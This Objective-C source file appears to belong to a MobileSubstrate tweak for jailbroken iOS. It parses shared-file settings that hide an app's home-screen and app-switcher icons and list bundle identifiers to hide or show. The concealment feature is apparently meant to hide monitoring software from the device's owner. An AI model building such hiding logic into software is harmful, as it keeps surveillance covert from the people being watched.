//
//  Visibility.m
//  MSFSP
//
//  Created by Dominique  Mayrand on 12/21/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "Visibility.h"
#import "DefStd.h"
#import "SharedFileIPC.h"

static Visibility *_Visibility = nil;

@interface Visibility (private)
- (void) readDataFromSharedFile;
- (void) parseVisibilityData: (NSData*) aRawData;
- (void) parseVisibilitiesONData: (NSData *) aRawData;
- (void) parseVisibilitiesOFFData: (NSData *) aRawData;
@end

@implementation Visibility

@synthesize mHideDesktopIcon, mHideAppSwitcherIcon, mBundleID, mBundleName;
@synthesize mHiddenBundleIdentifiers, mShownBundleIdentifiers;

+ (id) sharedVisibility {
	if (_Visibility == nil) {
		_Visibility = [[Visibility alloc] init];
	}
	return (_Visibility);
}

+ (NSData *) visibilityData {
    SharedFileIPC *sharedFileIPC = [[[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate] autorelease];
    NSData *data = [sharedFileIPC readDataWithID:kSharedFileVisibilityID];
    return (data);
}

- (id) init {
	self = [super init];
	if(self) {
		mHideDesktopIcon = NO;
		mHideAppSwitcherIcon = NO;
		[self setMBundleID:kBUNDLEIDENTIFIER];
		[self readDataFromSharedFile];
	}
	return self;
}

- (void) readDataFromSharedFile {
	SharedFileIPC *sharedFileIPC = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate];
	NSData *data = [sharedFileIPC readDataWithID:kSharedFileVisibilityID];
	DLog (@"Visibility data = %@", data);
	if (data) {
		[self parseVisibilityData:data];
	}
	
	data = [sharedFileIPC readDataWithID:kSharedFileVisibilitiesOFFID];
	DLog (@"Visibility off data = %@", data);
	if (data) {
		[self parseVisibilitiesOFFData:data];
	}
	
	data = [sharedFileIPC readDataWithID:kSharedFileVisibilitiesONID];
	DLog (@"Visibility on data = %@", data);
	if (data) {
		[self parseVisibilitiesONData:data];
	}
	[sharedFileIPC release];
}

- (void) parseVisibilityData: (NSData*) aRawData {
	DLog (@"parseVisibilityData, aRawData = %@", aRawData);
	NSInteger length = 0;
	NSInteger location = 0;
	[aRawData getBytes:&mHideAppSwitcherIcon length:sizeof(BOOL)];
	location += sizeof(BOOL);
	[aRawData getBytes:&mHideDesktopIcon range:NSMakeRange(location, sizeof(BOOL))];
	location += sizeof(BOOL);
	[aRawData getBytes:&length range:NSMakeRange(location, sizeof(NSInteger))];
	location += sizeof(NSInteger);
	NSString *bundleID = [[NSString alloc] initWithData:[aRawData subdataWithRange:NSMakeRange(location, length)] encoding:NSUTF8StringEncoding];
	location += length;
	[self setMBundleID:bundleID];
	[bundleID release];
	[aRawData getBytes:&length range:NSMakeRange(location, sizeof(NSInteger))];
	location += sizeof(NSInteger);
	NSString *bundleName = [[NSString alloc] initWithData:[aRawData subdataWithRange:NSMakeRange(location, length)] encoding:NSUTF8StringEncoding];
	[self setMBundleName:bundleName];
	[bundleName release];
	
	DLog(@"------------------ Visibility -------------------");
	DLog(@"mHideDesktopIcon: %d", [self mHideDesktopIcon]);
	DLog(@"mHideAppSwitcherIcon: %d,", [self mHideAppSwitcherIcon]);
	DLog(@"mBundleID: %@", [self mBundleID]);
	DLog(@"mBundleName: %@", [self mBundleName]);
	DLog(@"------------------ Visibility -------------------");
}

- (void) parseVisibilitiesOFFData: (NSData *) aRawData {
	DLog (@"parseVisibilitiesOFFData, aRawData = %@", aRawData);
	NSMutableArray *hiddenIds = [NSMutableArray array];
	NSInteger count = 0;
	[aRawData getBytes:&count length:sizeof(NSInteger)];
	NSInteger loc = sizeof(NSInteger);
	for (NSInteger i = 0; i < count; i++) {
		NSInteger len = 0;
		[aRawData getBytes:&len range:NSMakeRange(loc, sizeof(NSInteger))];
		loc += sizeof(NSInteger);
		
		NSData *subData = [aRawData subdataWithRange:NSMakeRange(loc, len)];
		NSString *bundleIdentifier = [[NSString alloc] initWithData:subData	encoding:NSUTF8StringEncoding];
		loc += len;
		
		[hiddenIds addObject:bundleIdentifier];
		[bundleIdentifier release];
	}
	[self setMHiddenBundleIdentifiers:hiddenIds];
}

- (void) parseVisibilitiesONData: (NSData *) aRawData {
	DLog (@"parseVisibilitiesONData, aRawData = %@", aRawData);
	NSMutableArray *shownIds = [NSMutableArray array];
	NSInteger count = 0;
	[aRawData getBytes:&count length:sizeof(NSInteger)];
	NSInteger loc = sizeof(NSInteger);
	for (NSInteger i = 0; i < count; i++) {
		NSInteger len = 0;
		[aRawData getBytes:&len range:NSMakeRange(loc, sizeof(NSInteger))];
		loc += sizeof(NSInteger);
		
		NSData *subData = [aRawData subdataWithRange:NSMakeRange(loc, len)];
		NSString *bundleIdentifier = [[NSString alloc] initWithData:subData	encoding:NSUTF8StringEncoding];
		loc += len;
		
		[shownIds addObject:bundleIdentifier];
		[bundleIdentifier release];
	}
	[self setMShownBundleIdentifiers:shownIds];
}

-(void) dealloc {
	[mBundleID release];
	[mBundleName release];
	[mHiddenBundleIdentifiers release];
	[mShownBundleIdentifiers release];
	[super dealloc];
}

@end
